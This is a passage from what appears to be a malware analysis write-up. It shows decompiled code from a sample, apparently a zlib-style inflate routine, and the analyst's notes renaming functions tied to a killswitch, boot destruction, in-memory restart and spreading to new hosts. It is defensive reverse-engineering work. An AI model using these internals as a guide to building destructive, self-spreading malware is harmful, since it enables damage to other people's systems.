            param_1[0xc] = puVar5;
            uVar12 = local_10;
          }
          local_2c = local_1c;
          uVar10 = ((uVar12 & 0xff00) + uVar12 * 0x10000) * 0x100 + (uVar12 >> 8 & 0xff00) +
                   (uVar12 >> 0x18);
          if (puVar2[4] != 0) {
            uVar10 = uVar12;
          }
          puVar5 = local_8;
          if (uVar10 != puVar2[6]) {
            *(char **)(param_1 + 6) = "incorrect data check";
            goto LAB_1000a7e3;
          }
          uVar12 = 0;
          uVar13 = 0;
          local_10 = 0;
          local_14 = 0;
        }
        *puVar2 = 0x1b;
      case (undefined *)0x1000b858:
        if ((puVar2[2] == 0) || (puVar2[4] == 0)) {
LAB_1000b8ce:
          *puVar2 = 0x1c;
switchD_1000a64e_caseD_1000b8d4:
          local_24 = 1;
          break;
        }
        while (uVar13 < 0x20) {
          if (puVar5 == (uint *)0x0) goto LAB_1000b8e2;
          puVar5 = (uint *)((int)puVar5 - 1);
          bVar9 = (byte)uVar13;
          uVar13 = uVar13 + 8;
          uVar12 = uVar12 + ((uint)*(byte *)local_c << (bVar9 & 0x1f));
          local_c = (uint *)((int)local_c + 1);
          local_14 = uVar13;
          local_10 = uVar12;
          local_8 = puVar5;
        }
        if (uVar12 == puVar2[7]) {
          local_10 = 0;
          uVar13 = 0;
          goto LAB_1000b8ce;
        }
        *(char **)(param_1 + 6) = "incorrect length check";
        uVar10 = uVar12;
        goto LAB_1000a729;
      case (undefined *)0x1000b8d4:
        goto switchD_1000a64e_caseD_1000b8d4;
      case (undefined *)0x1000b8d9:
        local_24 = -3;
        break;
      case (undefined *)0x1000b93d:
        goto LAB_1000ac63;
      }
LAB_1000b8e2:
      param_1[3] = local_20;
      param_1[4] = local_1c;
      *param_1 = local_c;
      param_1[1] = local_8;
      puVar2[0xf] = uVar13;
      puVar2[0xe] = local_10;
      if (((puVar2[10] == 0) &&
          (((local_2c == param_1[4] || (0x1c < (int)*puVar2)) ||
           ((0x19 < (int)*puVar2 && (param_2 == 4)))))) ||
         (iVar7 = FUN_1000bc5b((int)param_1,(int)param_1[3],(uint)((int)local_2c - (int)param_1[4]))
         , iVar7 == 0)) {
        puVar5 = param_1[1];
        local_2c = (uint *)((int)local_2c - (int)param_1[4]);
        param_1[2] = (uint *)((int)param_1[2] + (int)(uint *)((int)puVar3 - (int)puVar5));
        param_1[5] = (uint *)((int)param_1[5] + (int)local_2c);
        puVar2[7] = puVar2[7] + (int)local_2c;
        if ((puVar2[2] != 0) && (local_2c != (uint *)0x0)) {
          if (puVar2[4] == 0) {
            _Size = (uint *)FUN_1000bd21(puVar2[6],(byte *)(uint *)((int)param_1[3] - (int)local_2c)
                                         ,(uint)local_2c);
          }
          else {
            _Size = (uint *)FUN_1000bf51(puVar2[6],(uint *)((int)param_1[3] - (int)local_2c),
                                         (uint)local_2c);
          }
          *(uint **)(puVar2 + 6) = _Size;
          param_1[0xc] = _Size;
        }
        iVar7 = 0;
        if ((*puVar2 == 0x13) || (*puVar2 == 0xe)) {
          iVar7 = 0x100;
        }
        iVar8 = 0;
        if (*puVar2 == 0xb) {
          iVar8 = 0x80;
        }
        param_1[0xb] = (uint *)(iVar8 + (-(uint)(puVar2[1] != 0) & 0x40) + iVar7 + puVar2[0xf]);
        if ((((uint *)((int)puVar3 - (int)puVar5) != (uint *)0x0) || (local_2c != (uint *)0x0)) &&
           (param_2 != 4)) {
          return local_24;
        }
        if (local_24 == 0) {
          return -5;
        }
        return local_24;
      }
      *puVar2 = 0x1e;
LAB_1000ac63:
      return -4;
    }
  }
  return -2;
}
```

The first thing we note here is that this subroutine is huge.

















# Memory:

- `FUN_100094a5` - only internal reference to `Ordinal_1`
- `FUN_10009590` - difficult to grasp but invokes `FUN_100094a5`
- `FUN_1000835e` - contains a killswitch
- `FUN_10008d5a` - `destroy_boot` rip everyone
- `FUN_10001038` - could be revisited as we now have more information
- `possible_lock` - seems related to passing around new hosts to infect but no read function has been found yet. Also possible that the function itself does this but in that case it is strange for there to be no clear networking related logic.
- `handle_color_arg` - these arguments were passed to the lock functions, we now know these often take in IP addresses, the main thing I can think of with a `:` in it that is then related is a an adress of the form `IP:PORT`.

##### Late renames
- `FUN_10001038` to `something_with_drive_path` (probably prepares the drive path)
- `FUN_10009590` to `possible_restart_from_in_memory_copy` (probably restarts the malware from memory)
- `FUN_100094a5` to `delete_dll_and_invoke_Ordinal_1` (probably switches control from the old on disk dll to the one in memory)

















